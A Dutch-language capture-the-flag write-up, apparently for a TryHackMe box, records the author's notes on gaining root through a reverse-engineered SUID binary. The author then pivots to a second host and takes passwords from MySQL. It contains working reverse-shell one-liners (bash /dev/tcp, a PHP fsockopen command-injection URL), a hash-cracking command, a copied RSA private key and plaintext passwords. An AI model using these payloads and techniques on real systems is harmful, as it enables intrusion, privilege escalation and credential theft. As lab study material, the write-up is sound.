██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝




Unable to decompress.
```
Werkt niet: 
- `$ ./crypt.unpacked 1cryptupx_edit_okteta`
- `$ ./crypt.unpacked crypt.unpacked `


**Observaties**
- Het lijkt een soort decompressor te zijn, maar waarvoor
- SHA256
- GOST3341
- HMAC
- _crypt_PBKDF2_SHA256 een key derivation function
- Client Key
- Een of ander gedicht zit erin
- DST not allowed in SUID/SGID programs --> Dynamic String Token
Dit zijn speciale variabelen (zoals `$ORIGIN`, `$LIB` of `$PLATFORM`) die je in het zoekpad voor gedeelde bibliotheken (de RPATH of RUNPATH van een ELF-binary) kunt zetten. De dynamic linker (ld.so) vervangt deze tokens tijdens het opstarten door het daadwerkelijke pad.
`$ORIGIN`: Wordt vervangen door de map waarin het uitvoerbare bestand zelf staat. Dit is erg handig voor draagbare software, zodat het programma zijn eigen .so-bestanden relatief ten opzichte van zijn eigen locatie kan vinden.
`$LIB`: Wordt vervangen door de standaard bibliotheekmap voor de architectuur (bijv. lib of lib64).
`$PLATFORM`: Wordt vervangen door de specifieke hardware-architectuur van het systeem (bijv. x86_64).
De foutmelding "DST not allowed in SUID/SGID programs" is een beveiligingsmaatregel van de dynamic linker (ld.so).
Wanneer een programma de SUID- (Set User ID) of SGID-bit (Set Group ID) heeft, wordt het uitgevoerd met de rechten van de eigenaar van het bestand (vaak root), en niet met de rechten van de gebruiker die het start.
Als een dergelijk programma Dynamic String Tokens (zoals `$ORIGIN`) zou toestaan, ontstaat er een groot beveiligingslek (privilege escalation):
Een kwaadwillende gebruiker kan een hard link of symlink maken naar het SUID-programma in een eigen, beschrijfbare map (bijvoorbeeld /tmp/mijn_map/).
De gebruiker plaatst een kwaadaardige bibliotheek (.so) in diezelfde map.
Bij het starten van de link zou `$ORIGIN` verwijzen naar /tmp/mijn_map/, waardoor het programma met root-rechten de kwaadaardige code van de gebruiker inlaadt.
Om dit soort aanvallen te voorkomen, blokkeert Linux het uitbreiden van DST's zodra een programma met verhoogde rechten (SUID/SGID) wordt gestart.

--> Kijken met Ghidra

Het stuk van de code waar dat gedicht te zien is
![alt text](Screenshot_20261114_151344.png "Title")

Ik denk dat dit tot helemaal niks leidt.
Iets interessants ahv het kijken door de strings met Ghidra:
```c

undefined8 FUN_004016ad(int param_1,long param_2)

{
  int iVar1;
  long lVar2;
  undefined8 uVar3;
  char *pcVar4;
  undefined8 uStack_420;
  undefined1 auStack_418 [1024];
  
  uStack_420 = 0x4016c9;
  FUN_0041eaa0(&DAT_00495000);
  uStack_420 = 0x4016d5;
  FUN_0041eaa0(&DAT_004950f7);
  uStack_420 = 0x4016e1;
  FUN_0041eaa0(&DAT_004951ee);
  uStack_420 = 0x4016ed;
  FUN_0041eaa0(&DAT_004952e5);
  uStack_420 = 0x4016f9;
  FUN_0041eaa0(&DAT_004953dc);
  uStack_420 = 0x401705;
  FUN_0041eaa0(&DAT_004954d3);
  if (param_1 == 2) {
    uVar3 = *(undefined8 *)(param_2 + 8);
    uStack_420 = 0x401721;
    iVar1 = thunk_FUN_0042c990(uVar3,&DAT_004955cb);
    pcVar4 = "\nYou wish!";
    if (iVar1 != 0) {
      uStack_420 = 0x40173a;
      thunk_FUN_0042c9f0(auStack_418,uVar3);
      uStack_420 = 0x401742;
      lVar2 = thunk_FUN_0042cab0(auStack_418);
      if (auStack_418[lVar2 + -1] == '\n') {
        auStack_418[lVar2 + -1] = 0;
      }
      uStack_420 = 0x40175d;
      uVar3 = FUN_00401d90(auStack_418,"$2b$15$TXl.yuAF49958vsn1dqPfe");
      uStack_420 = 0x40176c;
      iVar1 = thunk_FUN_0042c990(uVar3,
                                 "$2b$15$TXl.yuAF49958vsn1dqPfeR9YpyBuWAZrm/dTG5vuG6m3kJkMXWm6");
      if (iVar1 == 0) {
        uStack_420 = 0x40177b;
        FUN_00453290(0,0,0);
        uStack_420 = 0x401787;
        FUN_0041ddc0("/bin/bash");
        return 0;
      }
      pcVar4 = "Unable to decompress.";
    }
    uStack_420 = 0x401795;
    FUN_0041eaa0(pcVar4);
  }
  return 0;
}
```
Merk op dat er dit staat:
- `    pcVar4 = "\nYou wish!";
- `        FUN_0041ddc0("/bin/bash");`
- Deze binary heeft SUID set, en er is iets wat bash aanroept --> Manier om root shell te krijgen?
- Er staat hier ook dat "unable to decompress." wat we eerder al eruit hebben gekregen.

Vermoedens:
- `FUN_0041ddc0` een soort `system()` is.
- Deze functie is de echte `main` en de inputs zijn `int argv, char* argc[]`



Cleanup:
```c

undefined8 main(int argv,char **argc)

{
  int strcmp_result;
  long lVar1;
  undefined8 hash_output;
  char *print_buffer;
  undefined8 uStack_420;
  undefined1 buffer [1024];
  char *input_string;
  
                    /* Print cryptshell logo */
  uStack_420 = 0x4016c9;
  print(&DAT_00495000);
  uStack_420 = 0x4016d5;
  print(&DAT_004950f7);
  uStack_420 = 0x4016e1;
  print(&DAT_004951ee);
  uStack_420 = 0x4016ed;
  print(&DAT_004952e5);
  uStack_420 = 0x4016f9;
  print(&DAT_004953dc);
  uStack_420 = 0x401705;
  print(&DAT_004954d3);
  if (argv == 2) {
    input_string = argc[1];
                    /* Check trivial -h input */
    uStack_420 = 0x401721;
    strcmp_result = strcmp(input_string,&DAT_004955cb);
    print_buffer = "\nYou wish!";
    if (strcmp_result != 0) {
      uStack_420 = 0x40173a;
      thunk_FUN_0042c9f0(buffer,input_string);
      uStack_420 = 0x401742;
      lVar1 = thunk_FUN_0042cab0(buffer);
                    /* remove \n */
      if (buffer[lVar1 + -1] == '\n') {
        buffer[lVar1 + -1] = 0;
      }
                    /* Compute hash from input */
      uStack_420 = 0x40175d;
      hash_output = hash(buffer,"$2b$15$TXl.yuAF49958vsn1dqPfe");
      uStack_420 = 0x40176c;
      strcmp_result =
           strcmp(hash_output,"$2b$15$TXl.yuAF49958vsn1dqPfeR9YpyBuWAZrm/dTG5vuG6m3kJkMXWm6");
      if (strcmp_result == 0) {
                    /* start bash */
        uStack_420 = 0x40177b;
        FUN_00453290(0,0,0);
        uStack_420 = 0x401787;
        system("/bin/bash");
        return 0;
      }
      print_buffer = "Unable to decompress.";
    }
    uStack_420 = 0x401795;
    print(print_buffer);
  }
  return 0;
}



```

Hashes uit dit bestand:
- `$2b$15$TXl.yuAF49958vsn1dqPfe` --> Dit zal wel het salt deel zijn
- `$2b$15$TXl.yuAF49958vsn1dqPfeR9YpyBuWAZrm/dTG5vuG6m3kJkMXWm6` --> Dit hash result erachter geplakt
Van Hashcat website https://hashcat.net/wiki/doku.php?id=example_hashes :
`30600 	bcrypt(sha256($pass)) / bcryptsha256 * 	$2b$10$FxDtpTNaL303lLcWtd6LFO2U6Gc63VJ07qycHcfqbQQ71GhO/qSzu `

- `iVar2 = strcmp(pcVar1,&DAT_004955cb);` vergelijkt met `-h`

```
$ ./crypt.unpacked -h
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝


You wish!
```

### Hashcat cracking of cryptshell hash
```
hashcat -m 30600 -a 0 hashes.txt ~/Documents/tryhackme/tools/wordlists/Passwords/Leaked-Databases/rockyou-75.txt
```
Volgens https://bcrypt-generator.com/ is `mike` de input wat `$2b$15$TXl.yuAF49958vsn1dqPfeR9YpyBuWAZrm/dTG5vuG6m3kJkMXWm6` geeft.
En dat opent inderdaad ook een bash shell!

### QOL reverse shell ipv gedoe met curl?
https://www.invicti.com/learn/reverse-shell
Op attack machine:
```
# (Nmap's netcat)
ncat -l -p 1337
```

Op target
```
/bin/bash -i >& /dev/tcp/ATTACKERIP/32721 0>&1
```

PHP versie:
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKERIP/32721 0>&1'");
```
https://hacking-notes.jord4n.pro/cheat-sheets/shells-post-exploitation/reverse-shells

```
$ curl "http://10.112.150.105/index.php?path=;nc%20%2Dv"
curl: (52) Empty reply from server
```

Gewoon in de browser url is makkelijkste:
>http://10.112.150.105/index.php?path=;php%20-r%20%27$sock=fsockopen(%22192.168.195.67%22,32721);$proc=proc_open(%22/bin/sh%20-i%22,array(0=%3E$sock,1=%3E$sock,2=%3E$sock),$pipes);%27
```
$ ncat -l -p 32721
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Geeft een reverse shell 😎.

`/usr/share/man/zh_TW/crypt`
```
$ ./crypt mike
whoami
root
```
We hebben root!
`http://10.112.150.105/index.php?path=;php%20-r%20%27$sock=fsockopen(%22192.168.195.67%22,32721);$proc=proc_open(%22/bin/sh%20-i%22,array(0=%3E$sock,1=%3E$sock,2=%3E$sock),$pipes);%27`
Command: `/usr/share/man/zh_TW/crypt mike`

### Uitzoeken wat we moeten doen met root

SSH key krijgen voor makkelijkere toegang tot het mike account:
```
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
YQCmjcL3T4j7v3/ddOBsTgxwi/+ZRZtRqJlvKEevPHJ8cR1DX7mmNyU3w/DRMnrW
djcIozYXVYdmj9v3e8xPbR6ybJX6fKpTuaDVdiwqQAecbvs5tBUkonAYUBuv1nhb
p/6+ZRYWNWv9RXE1XRuhROXD1Kl/tm7z4EcGZEDHu36oka23JJL7vzMeNtAdz3JF
wlGAtXH1cpdNa3+JKl/dBrRjV+YT3YivlqA2z4tRx/sA91RTxEO5oTYEL0bR1cKg
UPf1b21ecna8mpvQnkQmqQe8W9tSSlzVb6jnowIDAQABAoIBAA09O4liSy6lFUJv
8mP+kKgilwZiTPLVkneRjU0lUp+rIq78nJGkBF4X78T4uHO6xV13IqTN1wlvTezU
y2FqxjaVEN/8oQrCc1AxxREOSEpqjq24NyFqL4fKnNvMr4uZ7I60+FktI8SOOKsT
iEcsh8eQn10TRszuxEOpI5Ol6eWSzMPKxuw4ChniJsvaz8IDkYd4O/MDddjgcttb
Wv+LhX7qANPnRzeIDUNG2wmy3U+gxIJno/h3Xec0kVNQ0qwZmr56DO9G1oBbTU+4
6ynpIG2hEbSwGktWmnfw/4O+DZr8NiqeLY10G0MIwFIycuj2QfIF+mY6nqCZPWrH
8Lkf8wECgYEA0PMS/uqxL5u4e+bwSPdtfhEvFxk33/+PWMFIx0c5v7/jwtSW+/0v
YEIDC/DmHh9h4aF8dHMg8x18B50dw0HuLHWIgezNjJ9M8jwQgixRGamc5m6oFWh5
59581KWVIuDFqLG/6DN6cW/QQDo2MrNKP3QADeUPb2jhflzmir0TDLECgYEAwNud
VzZ6ON5YvbJbNh/JltSS1jAqUftzheX/m+3VrjE0iChLGvyP84aY7qpbiXNLHe+3
1/4JPoTljlml2RMTdZjAiF52u6KXwOLx6alGFoSbmAoZYG/4/Z0pwLjcozWGrjYD
03EDPdCclzWFyCqD9pYFGVAvEJuqx3rGYm1x/pMCgYEA0IdWFNwqOsYhBl6CvX9Z
YbBKm7XKQp2s9LnpJSAbLReXebBqgk+6gUk/+yHOto9BQ0nDiAACCT8KshqGQoDA
7tPZiTjIJqgwxatWGmOaCI9yi7IxwzPCPbqYQCyEOwuxl9rVGCqP7zfU0NSHlG/E
ELF3AGby0ZANQuv6FMn/gfECgYEAkjoyK31P4KyeBn8kb35coDNffm2YuP56Ei1Y
yMblPKVsWkyK3dRf5VrJvDSJIUe8zd8Duw6PvcqQL4XDnTq8h26hlQRi7FQU0hiB
KhTB4rL7MqV9pkRgOxOeI9VG3azpCFBGSFypA4aYJIJdhG7QDfijtxS4CtStAYES
yHCJfWcCgYAFzAx6hwi9smlvCpoZ1D8TRyqlxKf4YtSkTl74ZyiRESfvpuZSiclg
mFdVoHOt+gkpsXkmGmuqymIBRYGEw3dJ2C4MRPjx0UFpua0BAZ5k0ly6eaZuejWj
0/AHOf/jOfwvM4G2X0L8yjJqq/5F6NOjf9uxEusphzDcr/I1inuY3A==
-----END RSA PRIVATE KEY-----
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdaY6csdB8HGtbRbRi4KJO64aMIxSshITiF0Mwy5mu5bqeP7NhAKaNwvdPiPu/f9104GxODHCL/5lFm1GomW8oR688cnxxHUNfuaY3JTfD8NEyetZ2NwijNhdVh2aP2/d7zE9tHrJslfp8qlO5oNV2LCpAB5xu+zm0FSSicBhQG6/WeFun/r5lFhY1a/1FcTVdG6FE5cPUqX+2bvPgRwZkQMe7fqiRrbckkvu/Mx420B3PckXCUYC1cfVyl01rf4kqX90GtGNX5hPdiK+WoDbPi1HH+wD3VFPEQ7mhNgQvRtHVwqBQ9/VvbV5ydryam9CeRCapB7xb21JKXNVvqOej mike@host1
```

Hack into me and look for the hidden flag. Look beyond the horizon. 
Zijn er andere machines op het netwerk?
```
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
        RX packets 170  bytes 15286 (15.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 378  bytes 35152 (35.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
        RX packets 33  bytes 2622 (2.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28  bytes 2136 (2.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 273  bytes 33234 (33.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 273  bytes 33234 (33.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Budget nmap:
`for i in {0..255}; do ping -c 1 -W 1 172.16.20.$i >/dev/null && echo 172.16.20.$i; done`
```
172.16.20.2
172.16.20.6
```

### Attack 172.16.20.6
```
ssh 172.16.20.6
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
```
Staan er credentials op de huidige machine?
Werkt niet:
- `ssh -i id_rsa mike@172.16.20.6 -vvv`
- `ssh -i id_rsa.pub mike@172.16.20.6 -vvv`
- `ssh -i id_rsa.pub mike@host1`
- `ssh -i id_rsa.pub mike@host2`
- `ssh -i id_rsa mike@172.16.20.2`
Het probleem is omdat SSH zeurt en eigenlijk wil dat ik "yes" typ omdat het de host niet herkent
`ssh -i id_rsa -o StrictHostKeyChecking=no mike@172.16.20.6`

```
ssh -i id_rsa -o StrictHostKeyChecking=no mike@172.16.20.6
Pseudo-terminal will not be allocated because stdin is not a terminal.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

whoami
mike
hostname
host2
```
```
cat /etc/passwd
*
mysql:x:107:109:MySQL Server,,,:/nonexistent:/bin/false
*
```
Er gaat vanalles fout
```
pollinate:x:108:1::/var/cache/pollinate:/bin/false
mysql:x:107:109:MySQL Server,,,:/nonexistent:/bin/false
mike:x:1001:1001::/home/mike:/bin/bash
mysql -u mike 
ERROR 1045 (28000): Access denied for user 'mike'@'localhost' (using password: NO)
mysql -u mike -p mike
Enter password: mike
ERROR 1045 (28000): Access denied for user 'mike'@'localhost' (using password: YES)
mysql -u mike -p password
Enter password: password
ERROR 1044 (42000): Access denied for user 'mike'@'localhost' to database 'password'
mysql -u mike
ERROR 1045 (28000): Access denied for user 'mike'@'localhost' (using password: NO)
mysql -u mike -p
Enter password: password
show databases



;
;
```

### Mysql op 172.16.20.6

Terug komen:
`http://10.112.150.105/index.php?path=;php%20-r%20%27$sock=fsockopen(%22192.168.195.67%22,32721);$proc=proc_open(%22/bin/bash%20-i%22,array(0=%3E$sock,1=%3E$sock,2=%3E$sock),$pipes);%27`
```
/usr/share/man/zh_TW/crypt mike

cd /home/mike/.ssh
ssh -i id_rsa -o StrictHostKeyChecking=no mike@172.16.20.6

script /dev/null -q c bash
export SHELL=/bin/bash
export TERM=xterm-256color
stty sane

su root
#bjsig4868fgjjeog
```

Nu gaat het wel goed;
```
mike@host2:~$ mysql -p
mysql -p
Enter password: password

Welcome to the MySQL monitor.  Commands end with ; or \g.
```
```

mysql> show databases
show databases
    -> ;
;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+
2 rows in set (0.00 sec)
```
```
mysql> show tables
show tables
    -> ;
;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)

mysql> select * in users
select * in users
    -> ;
;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'in users' at line 1
mysql> select * from users
select * from users
    -> ;
;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | bjsig4868fgjjeog    |
| mike  | WhatAreYouDoingHere |
+-------+---------------------+
2 rows in set (0.00 sec)
```

mike@host2:~$ su root
su root
Password: bjsig4868fgjjeog

root@host2:/home/mike# 

```
root@host2:~# ls
ls
mike.zip
root@host2:~# pwd
pwd
/root
root@host2:~# unzip mike.zip
unzip mike.zip
Archive:  mike.zip
[mike.zip] mike password: WhatAreYouDoingHere

 extracting: mike     

 root@host2:~# ls -l 
ls -l
total 8
-rw-r--r-- 1 root root  32 Jul 16  2021 mike
-rw------- 1 root root 218 Jul 16  2021 mike.zip
root@host2:~# cat mike
cat mike
THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}

```

O mijn god, de flag.
FLAG: `THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}`